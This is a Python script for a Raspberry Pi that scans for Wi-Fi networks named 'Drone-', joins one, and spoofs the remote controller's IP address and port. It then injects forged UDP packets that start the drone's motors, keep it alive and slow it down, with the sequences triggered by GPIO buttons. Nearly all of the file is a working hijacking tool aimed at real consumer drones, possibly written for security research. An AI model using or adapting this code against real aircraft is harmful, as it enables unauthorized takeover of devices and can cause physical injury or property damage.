#!/usr/bin/python3

# general imports
import os
import time
import subprocess
import signal
from scapy.all import IP, UDP, send
from subprocess import Popen, PIPE, STDOUT, DEVNULL, run
import RPi.GPIO as GPIO

#LED and Button Setup
GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
GPIO.setup(17, GPIO.IN,pull_up_down=GPIO.PUD_UP)
GPIO.setup(27, GPIO.IN,pull_up_down=GPIO.PUD_UP)

# imports from local files
import iw_parse

# Interface defaults to "wlan0"
IFACE = "wlan1"
# Threshold defaults to -50
THRESH = -500

drone_ip = '172.50.10.1'
drone_port = 10005
controller_ip = '172.50.10.254'
controller_port = 36263

# Check for root
if os.geteuid() != 0:
    print('Program has no root privileges')
    exit()
print('Checked for root privileges')

print(f'Using drone parameters: Drone IP: {drone_ip}, Drone Port: {drone_port}, RC IP: {controller_ip}, RC Port: {controller_port}')

# Prepare Network Interface
subprocess.run(f'airmon-ng check kill', shell=True, stdout=DEVNULL)
time.sleep(1)
subprocess.run(f'ip link set {IFACE} up', shell=True)
time.sleep(1)
print(f'Killed disturbing network services')
subprocess.run(f'ifconfig {IFACE} 172.50.10.254 netmask 255.255.255.0', shell=True)
time.sleep(1)
subprocess.run(f'route add default gw 172.50.10.1', shell=True)
time.sleep(1)
print(f'Prepared network settings')

searchstring = 'Drone-'
drone_network = []
old_essid = "not found"

# start scanning for drones
print(f'Scanning for drone networks on {IFACE} at 5745 MHz')
while not drone_network:
    # scan using iw command and measuring time
    # 50ms delay to ensure iw scan does not use data from cache
    time.sleep(0.05)
    networks = iw_parse.get_interfaces(interface=IFACE, freq="5745")
    drone_network = [network for network in networks if searchstring in network['Name']]

    # check if drone network was found
    if drone_network:
        # retreive values
        drone_network = drone_network[0]
        drone_essid = drone_network['Name']
        drone_dbm_signal = int(drone_network['Signal Level'][0:3].replace('.',''))

        print(f'Signal strength of {drone_essid} is {drone_dbm_signal} dBm')

        # INFO-log first occurence of new Drone Network
        if old_essid != drone_network['Name']:
            print(f'Approaching drone found: ESSID: {drone_essid}, dBm: {drone_dbm_signal}')
            old_essid = drone_network['Name']

        if drone_dbm_signal < THRESH:
            drone_network = []


print(f'Drone within range limit: ESSID: {drone_essid}, dBm: {drone_dbm_signal}')

subprocess.run(f'iw dev {IFACE} connect -w {drone_essid}', shell=True, stdout=PIPE, stderr=PIPE)

print(f'Successfully connected to ESSID: {drone_essid}')
subprocess.run(f'route add default gw 172.50.10.1', shell=True)
time.sleep(1)

# build desired forged packages
ip = IP(src = controller_ip, dst=drone_ip)
udp = UDP(sport = controller_port, dport = drone_port)

cmd_keep_alive = bytearray.fromhex('401e0000fe1607ff0146dc05dc05dc05dc0514054c04dc054c044c04dc05ff01b08d')
pkt_keep_alive = ip/udp/cmd_keep_alive

cmd_start_motor = bytearray.fromhex('401e0000fe1607ff01466c076c074c044c0414054c04dc054c044c04dc05ff01ebbc')
pkt_start_motor = ip/udp/cmd_start_motor

cmd_slow_down = bytearray.fromhex('401e0000fe1607ff0146dc05dc054c04dc0514054c04dc054c044c044c04ff018bd3')
pkt_slow_down = ip/udp/cmd_slow_down

print(f'Executing drone commands')

while True:
    if not GPIO.input(27):
        #logger.info(f'Entering Mode 1')
        print(f'Executing start motor command')
        for i in range(0,10):
            send(pkt_start_motor, iface=IFACE, verbose=0)
            time.sleep(0.1)
        print(f'Executing keep alive commands')
        for i in range(0,10):
            if GPIO.input(27):
                break
            send(pkt_keep_alive, iface=IFACE, verbose=0)
            time.sleep(1)
        print(f'Executing stop command')
        for i in range(0,10):
            send(pkt_slow_down, iface=IFACE, verbose=0)
            time.sleep(0.1)
        print(f'Executing keep alive commands')
        for i in range(0,180):
            if GPIO.input(27):
                break
            send(pkt_keep_alive, iface=IFACE, verbose=0)
            time.sleep(1)
    if not GPIO.input(17):
        #logger.info(f'Entering Mode 2')
        send(pkt_start_motor, iface=IFACE, verbose=0)
        time.sleep(1)
    else:
        #logger.info(f'Entering Mode 0')
        #send(pkt_slow_down, iface=IFACE, verbose=0)
        time.sleep(1)
